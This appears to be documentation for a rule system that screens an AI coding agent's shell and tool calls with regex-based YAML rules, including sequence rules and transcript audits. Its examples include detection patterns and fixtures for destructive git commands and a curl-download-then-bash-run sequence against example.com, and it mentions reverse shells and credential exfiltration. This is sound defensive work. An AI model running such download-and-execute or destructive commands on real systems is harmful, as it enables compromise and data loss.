# Security rules

## What it is

The PreToolUse hook checks every Bash command (and other tool calls) against a set of rules before it runs. Each rule is a small YAML file ending in `.rule.yaml`. A rule has an id, a severity, a pattern and its own test strings. The same rule files are used after the fact by `pai audit scan`, which reads a finished transcript.

## When to use it

- You want to block or confirm a command that PAI does not know about.
- You want to turn off a built-in rule that gets in your way.
- You want to check a finished session or worker for risky behaviour.

## Where rule files are loaded from

In this order. A later file with the same `id` replaces the earlier one.

1. Built-in rules, shipped with the package.
2. `<PAI home>/rules/*.rule.yaml`, your own rules.
3. `.pai/rules/*.rule.yaml` in the project directory.

Project rules are less trusted, because a repository can ship them. A project file may add a new rule or raise the severity of an existing one. It cannot switch a built-in off, lower its severity or swap its pattern for a weaker one. Such a file is ignored and reported. To disable a built-in, put the override in `<PAI home>/rules`.

## Severities

| Severity | Effect |
|---|---|
| `block` | The call is denied. |
| `confirm` | You are asked before it runs. |
| `warn` | The call runs and a security event is logged. |
| `off` | The rule id is disabled. It needs no `match`. |

If several rules hit, the first `block` wins, then the first `confirm`, then the first `warn`.

## Rule file format

```yaml
# git reset --hard throws away uncommitted work.
id: git-reset-hard
severity: confirm
category: dangerous_git
match: /\bgit\s+reset\s+--hard/i
reason: git reset --hard discards uncommitted changes
tests:
  match:
    - git reset --hard HEAD~1
  no_match:
    - git reset HEAD~1
    - git commit -m "git reset --hard notes"
```

Fields:

- `id`: unique name. Reusing an id overrides the earlier rule.
- `severity`: `block`, `confirm`, `warn` or `off`.
- `match`: a regex, written `/source/flags` or as a plain string. The flags `g` and `y` are stripped.
- `flags`: regex flags, if you do not use the `/source/flags` form.
- `tool`: regex on the tool name. Default `Bash`.
- `reason`: shown in the deny message.
- `category`: optional group name for security events. Defaults to the id.
- `quoted`: see below.
- `text_ok`: confirm rules only. Skip text that only mentions the payload: a commit message, a `grep`/`rg` pattern, `echo`/`printf`, a heredoc written to a file. The built-in instruction-override rules use it.
- `results`: for single-step rules in `pai audit scan` only. Also test tool results, not just tool calls.
- `tests`: fixtures. Every `match` string must hit, every `no_match` string must not.

## Quoted and unquoted matching

By default a rule tests the command with quoted strings removed. Text inside a commit message or an `echo` is not a command, so `git commit -m "git reset --hard notes"` does not hit the rule above.

Some payloads are dangerous inside quotes, for example a reverse shell inside `bash -c "..."`. A rule with `quoted: true` also tests the text as written and with only the quote marks removed. Anchor such a rule on command position, so a message that merely mentions the payload stays allowed. Every built-in block rule that needs this is marked.

Patterns should not cross `;`, `&&` or `|`. Match within one command segment.

## Shared building blocks (built-in rules)

Built-in rules are written with macros that the generator (`scripts/gen-builtin-rules.mjs`) expands into the final regex, so every rule spells command position, prefix wrappers and shell sinks the same way. The macros work only in built-in files, not in user or project rules.

| Macro | Matches |
|---|---|
| `{{CMD}}` | Command position (line start, after `;` `&` `\|` `(` `{` a backtick or `$(`, after `then`/`do`/`else`, inside `sh -c "`), then any prefix wrappers (`command`, `env`, `exec`, `nohup`, `time`, `sudo`, `nice`, `xargs`, `VAR=value`), then an optional leading backslash or absolute path. The binary name follows. |
| `{{SHELL}}` | A shell sink: `sh`, `bash`, `zsh`, `dash`, `ksh`, `fish` with wrappers and a path, optionally in parentheses. Not `bash-completion` or `sh_tool`. |
| `{{SHELL_OR_INTERP}}` | `{{SHELL}}` plus `python`, `perl`, `ruby`, `node`. |
| `{{PIPE}}` | A pipe, `\|` or `\|&`, never `\|\|`. |
| `{{GIT}}` | A git command at the start of a segment, wrappers allowed. |
| `{{RMREC}}`, `{{ARGEND}}` | A recursive `rm` up to one target argument, and the end of that argument. |
| `{{B64DEC}}` | `base64 -d/-D/--decode`, `xxd -r`, `openssl base64 -d`. |

Rules must stay fast on hostile input. The macros use no nested open-ended repeats: tokens are separated by whitespace and argument skips are bounded (`{0,16}`). Before a rule runs, the text is capped: over 64 KB keeps the first and last 32 KB, and every segment (split at `;` `&` `||` newline) over 4 KB keeps its first and last 2 KB. Backslash-newline joins lines. Each built-in rule has a perf test that runs it over 1 MB of padding in under 50 ms.

## Sequence rules

A rule with a `sequence` block describes several steps that together are suspicious. Each step alone is ordinary work. The hook does not run sequence rules live. `pai audit scan` evaluates them over a transcript.

```yaml
id: download-then-run
severity: block
reason: a downloaded file is executed shortly after
sequence:
  window_seconds: 300
  order: strict
  steps:
    - tool: Bash
      match: /\b(?:curl|wget)\b[^|;&]*\s-o\s*\S+/
    - tool: Bash
      match: /(?:^|[;&|]\s*)(?:bash|sh)\s+\S+/
tests:
  match:
    -
      - curl -o /tmp/x https://example.com/x.sh
      - bash /tmp/x
  no_match:
    -
      - curl -o /tmp/x https://example.com/x.sh
      - ls /tmp
```

- `window_seconds`: all steps must fall within this time of the first.
- `order`: `strict` means in step order, `any` means in any order.
- `tests` for a sequence rule are lists of steps. A plain string is a Bash step. An object `{tool, content}` names another tool.

Built-in sequence rules cover a credential read followed by an outbound call, a download followed by execution, and injected instructions followed by a tool call.

## Commands

```
pai rules list [--json]
pai rules lint [--json]
pai audit scan [PATH] [--session ID] [--worker ID] [--json]
```

- `pai rules list` shows every rule with severity, source and enabled state. A disabled rule shows as `off`.
- `pai rules lint` runs every rule's fixtures. It exits 1 on a failed fixture or a file that does not load. Run it after you add a rule.
- `pai audit scan` scans the newest session, a given session, a worker, or a transcript file. Findings are grouped by severity and evidence is masked. It exits 1 when a `block` finding hit. Every finished worker is scanned, and `pai worker ps` shows non-zero findings.

## Config keys

None. Rules are files, not settings.

## Worked example

You want a confirmation before anyone runs `terraform destroy`.

1. Create `<PAI home>/rules/terraform-destroy.rule.yaml`:

   ```yaml
   id: terraform-destroy
   severity: confirm
   reason: terraform destroy removes infrastructure
   match: /\bterraform\s+destroy\b/
   tests:
     match:
       - terraform destroy -auto-approve
     no_match:
       - terraform plan
       - echo "terraform destroy"
   ```

2. Run `pai rules lint`. All fixtures pass.
3. Run `pai rules list`. The rule appears with its source.
4. To disable a built-in you find too strict, add a file with the same id and `severity: off` under `<PAI home>/rules`.

## Lifecycle, firings and candidates

Every pattern in `antipatterns/<category>/` (shell rules and the loop-guard, final-text and path categories) carries lifecycle fields: `status` (experimental, test, stable, deprecated), `mode` (enforce, or monitor: record the firing, take no action), `layer`, `version`, `created`, `modified`, `supersedes`, `falsepositives`, and optionally `exceptions` (with an `expires` date), `applies_to` (providers, models) and `per_model`. Defaults are stable, enforce, version 1; `layer` defaults from the category. A deprecated pattern does nothing.

## Layers

| layer | what | per model |
|---|---|---|
| `baseline` | security and environment: credential reads, destructive git, `rm -rf`, home/root search, path deny, bench/model-server guards | no: always acts as configured; `applies_to` is ignored |
| `behaviour` | loops: identical-write, revert, distinct-rewrites, repeated-failure, growing-command, runaway-new-files, missing-path-streak, unparsed-tool-call | the same rule for every model; thresholds and mode may be tuned per model with `per_model` |
| `quirk` | observed for specific models only: `mangled-var-folders-path` (Gyro family) and future model-specific patterns | enforce for the models in `applies_to`, monitor for every other model |

Outside a behaviour or quirk rule's `applies_to` scope a firing is still recorded (monitor) but takes no action; a baseline rule outside any scope is off. A `per_model` block tunes one model (or a glob with `*`):

```yaml
per_model:
  "qwen3.8-flash-next-gyro-*": { mode: monitor }
  "qwen3.8-flash-next-gyro-m": { params: { stop_at: 8 } }
```

The first matching entry decides — an exact model id beats a glob, and among globs the first declared wins — and its `mode`/`params` override the file's global values at evaluation time. A user override's `per_model` entry replaces the shipped entry for the same key. `pai antipatterns set <id> <param> <value> --model <m>` writes `per_model.<model>.params.<param>` into the user override; without `--model` the global param changes.

Each place that acts on a pattern appends one line to `<PAI home>/antipatterns/firings.jsonl` (rotated at 10 MB): time, id, version, action, mode, provider, model, worker or session, project name, a sha1 of the matched input and its first 120 characters with home paths as `~`. When a worker run ends, one outcome line per firing goes to `outcomes.jsonl`. A guard stop no pattern covers becomes an inactive file under `antipatterns/_candidates/` for review.

`pai antipatterns` reads these: `list`, `stats` (counts, last fired, per model, outcome mix, false-positive rate, flags), `candidates`, `promote`, `enforce`, `monitor`, `retire`, `label`, `conflicts`. Changes are user override files with the same id; shipped files are never edited. The same operations are MCP tools named `antipatterns_*`.

## Related

- [Safety and audit in the feature map](../features.md#safety-and-audit)
- [Worker rules](../worker-rules.md)
- [`pai rules`](../commands/rules.md), [`pai antipatterns`](../commands/antipatterns.md), [`pai audit`](../commands/audit.md)
